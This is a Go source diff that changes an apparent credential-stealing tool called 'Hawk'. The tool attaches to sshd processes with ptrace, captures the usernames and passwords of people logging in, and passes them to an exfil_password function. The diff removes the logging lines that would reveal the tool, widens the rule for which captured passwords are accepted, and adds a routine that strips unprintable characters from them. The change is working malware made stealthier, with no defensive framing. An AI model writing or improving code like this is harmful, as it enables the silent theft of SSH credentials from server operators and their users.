@@ -5,18 +5,16 @@ import (
 	"io/ioutil"
 	"regexp"
 	"syscall"
+	"unicode"
 )
 
 func traceSSHDProcess(pid int) {
-	fmt.Printf("[Hawk] SSH Connection Identified on pid: %d.\n", pid)
-
 	err := syscall.PtraceAttach(pid)
 	if err != nil {
 		return
 	}
 	defer func() {
 		syscall.PtraceDetach(pid)
-		fmt.Printf("[Hawk] Detached from pid: %d.\n", pid)
 	}()
 
 	var wstatus syscall.WaitStatus
@@ -35,7 +33,6 @@ func traceSSHDProcess(pid int) {
 			var regs syscall.PtraceRegs
 			err := syscall.PtraceGetRegs(pid, &regs)
 			if err != nil {
-				fmt.Println("PtraceGetRegs:", err)
 				syscall.PtraceDetach(pid)
 				return
 			}
@@ -53,14 +50,10 @@ func traceSSHDProcess(pid int) {
 					if len(matches) == 2 {
 						username = string(matches[1])
 					}
-					var password = string(buffer)
-					valid := regexp.MustCompile(`\x00\x00\x00[^\n]*\f$`).MatchString(password)
-					if !valid {
-						fmt.Printf("Username: %q, Password %q\n", username, password)
-						go exfil_password(username, removeFirstFourBytes(password))
+					var password = removeNonPrintableAscii(string(buffer))
+					if len(password) > 2 && len(password) < 250 {
+						go exfil_password(username, removeNonPrintableAscii(password))
 					}
-				} else {
-					fmt.Printf("rdi: %d, rax: %d\n", regs.Rdi, regs.Orig_rax)
 				}
 			}
 		}
@@ -72,9 +65,14 @@ func traceSSHDProcess(pid int) {
 	}
 }
 
-func removeFirstFourBytes(input string) string {
-	if len(input) < 4 {
-		return ""
+func removeNonPrintableAscii(input string) string {
+	var resultBuilder []rune
+
+	for _, char := range input {
+		if unicode.IsPrint(char) && char >= 32 && char != 127 {
+			resultBuilder = append(resultBuilder, char)
+		}
 	}
-	return input[4:]
+
+	return string(resultBuilder)
 }
